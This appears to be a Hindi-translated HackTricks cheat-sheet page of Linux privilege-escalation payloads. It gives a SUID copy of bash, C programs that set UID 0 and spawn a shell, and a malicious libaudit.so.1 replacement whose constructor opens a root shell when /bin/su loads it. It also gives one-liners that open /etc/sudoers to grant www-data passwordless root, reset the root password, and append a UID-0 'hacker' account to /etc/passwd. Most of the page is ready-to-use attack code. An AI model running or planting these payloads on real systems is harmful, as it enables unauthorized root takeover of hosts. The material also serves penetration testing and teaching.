# निष्पादित करने के लिए Payloads

{{#include ../../banners/hacktricks-training.md}}

## Bash

`bash -p` privileged mode सक्षम करता है: जब Bash अलग-अलग real और effective IDs के साथ शुरू होता है, तो यह effective ID को real ID पर रीसेट नहीं करता। परिणामी shell अभी भी caller के मौजूदा credentials पर निर्भर करता है।<sup>[[1]](#references)[[3]](#references)</sup>
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C

`setresuid` अनुमति होने पर real, effective और saved IDs को बदलता है, जबकि `setuid` effective ID को बदलता है और privileged caller के लिए real तथा saved IDs भी सेट कर सकता है। `execve` current process image को अनुरोधित program से replace करता है।<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup> इन examples में return-value checks शामिल नहीं हैं; UID 0 के लिए भी दोनों credential calls fail हो सकती हैं।<sup>[[2]](#references)[[3]](#references)</sup>
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## Privileges बढ़ाने के लिए किसी file को overwrite करना

### सामान्य files

ये सामान्य local privilege-control files और interfaces हैं: `/etc/passwd` में seven-field account records store होते हैं, `/etc/shadow` में optional encrypted password data store होता है, `sudoers` sudo privileges और `NOPASSWD` जैसे tags define करता है, और Docker का default daemon endpoint `/var/run/docker.sock` पर Unix socket होता है; उस socket तक access मिलने से उसके host पर root-level control मिल सकता है।<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Password के साथ user को _/etc/passwd_ में add करें
- _/etc/shadow_ में password बदलें
- _/etc/sudoers_ में user को sudoers में add करें
- docker socket के माध्यम से Docker का abuse करें, जो आमतौर पर _/run/docker.sock_ या _/var/run/docker.sock_ में होता है

### किसी library को overwrite करना

Check करें कि कोई binary किन shared libraries का उपयोग करती है; इस example में `ldd` के साथ `/bin/su` का inspection करें।<sup>[[9]](#references)</sup>
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
`ldd` shared-object dependencies की जानकारी देता है, जबकि dynamic linker runtime पर उन्हें load करने के लिए ELF metadata और अपने search rules का उपयोग करता है।<sup>[[9]](#references)[[10]](#references)</sup>

किसी एक candidate का निरीक्षण करने के लिए, `objdump -T` का उपयोग `su` की dynamic symbol table प्रिंट करने और audit names के लिए filter करने हेतु करें।<sup>[[11]](#references)</sup>
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
`audit_open`, `audit_log_user_message`, और `audit_log_acct_message` libaudit functions हैं; इस output में `audit_fd` को `su` के `.bss` में परिभाषित data object के रूप में दिखाया गया है।<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> एक replacement library को उन undefined symbols के लिए compatible definitions export करनी होंगी जिन्हें loader resolve करता है; mismatched function/data ABIs तब भी process को fail कर सकते हैं जब वे symbols relocate या call किए जाते हैं।<sup>[[10]](#references)[[11]](#references)</sup>

GCC का `constructor` attribute समर्थित targets पर `main` से पहले `inject` को automatically call करवाता है।<sup>[[15]](#references)</sup>
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
यदि replacement को privileged **`/bin/su`** process द्वारा सफलतापूर्वक load किया जाता है, तो यह constructor उस process के privileges के साथ **`/bin/bash`** शुरू कर सकता है; सटीक परिणाम environment पर निर्भर करता है।<sup>[[10]](#references)[[15]](#references)</sup>

## Scripts

क्या आप root से कुछ execute करवा सकते हैं?

`sudoers` policy entries में `NOPASSWD` tag का उपयोग करता है, `chpasswd` standard input से `user:password` pairs पढ़ता है, और `/etc/passwd` सात colon-separated account fields का उपयोग करता है; निम्नलिखित examples मानते हैं कि संबंधित files उन्हें चलाने वाले process द्वारा writable हैं।<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>

### **www-data से sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **root password बदलें**
```bash
echo "root:hacked" | chpasswd
```
### `/etc/passwd` में नया root user जोड़ना

अंतिम payload उस target पर निर्भर करता है जो generated `crypt` hash स्वीकार करता है: Debian का `mkpasswd -m sha-512`, SHA-512 crypt (`$6$`) पर मैप करता है, जबकि OpenSSL का `passwd -1 -salt`, MD5-आधारित BSD algorithm (`$1$`) का उपयोग करता है।<sup>[[17]](#references)[[18]](#references)</sup>
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
## References

- [1] [The Set Builtin (Bash Reference Manual)](https://www.gnu.org/s/bash/manual/html_node/The-Set-Builtin.html)
- [2] [setresuid(2) — Linux manual page](https://man7.org/linux/man-pages/man2/setresuid.2.html)
- [3] [setuid(2) — Linux manual page](https://man7.org/linux/man-pages/man2/setuid.2.html)
- [4] [execve(2) — Linux manual page](https://man7.org/linux/man-pages/man2/execve.2.html)
- [5] [passwd(5) — Linux manual page](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [6] [sudoers(5) — Debian Manpages](https://manpages.debian.org/testing/sudo/sudoers.5.en.html)
- [7] [Docker daemon socket को सुरक्षित करें](https://docs.docker.com/engine/security/protect-access/)
- [8] [dockerd — Docker Docs](https://docs.docker.com/reference/cli/dockerd/)
- [9] [ldd(1) — Linux manual page](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [10] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [11] [objdump (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/objdump.html)
- [12] [audit_open(3) — Debian Manpages](https://manpages.debian.org/trixie/libaudit-dev/audit_open.3.en.html)
- [13] [audit_log_user_message(3) — Debian Manpages](https://manpages.debian.org/testing/libaudit-dev/audit_log_user_message.3.en.html)
- [14] [audit_log_acct_message(3) — Debian Manpages](https://manpages.debian.org/testing/libaudit-dev/audit_log_acct_message.3.en.html)
- [15] [Common Attributes (Using the GNU Compiler Collection)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [16] [chpasswd(8) — Linux manual page](https://man7.org/linux/man-pages/man8/chpasswd.8.html)
- [17] [mkpasswd.c — Debian Sources](https://sources.debian.org/src/whois/5.5.17/mkpasswd.c)
- [18] [openssl-passwd — OpenSSL Documentation](https://docs.openssl.org/master/man1/openssl-passwd/)
{{#include ../../banners/hacktricks-training.md}}
